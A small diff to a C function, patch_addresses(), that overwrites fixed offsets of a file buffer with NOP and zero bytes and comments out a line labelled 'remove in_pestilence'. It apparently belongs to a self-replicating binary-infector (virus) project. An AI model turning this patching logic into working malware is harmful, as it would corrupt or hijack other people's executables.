@@ -108,6 +108,6 @@ void		patch_addresses(t_info *info)
 	ft_memset(info->file + info->offset_bis + OFFSET_6, 5, '\x90');
 
 	// remove in_pestilence
-	ft_memset(info->file + info->offset_bis + OFFSET_7, 1, '\0');
+// 	ft_memset(info->file + info->offset_bis + OFFSET_7, 1, '\0');
 	ft_memset(info->file + info->offset_bis + OFFSET_8, 1, '\0');
 }
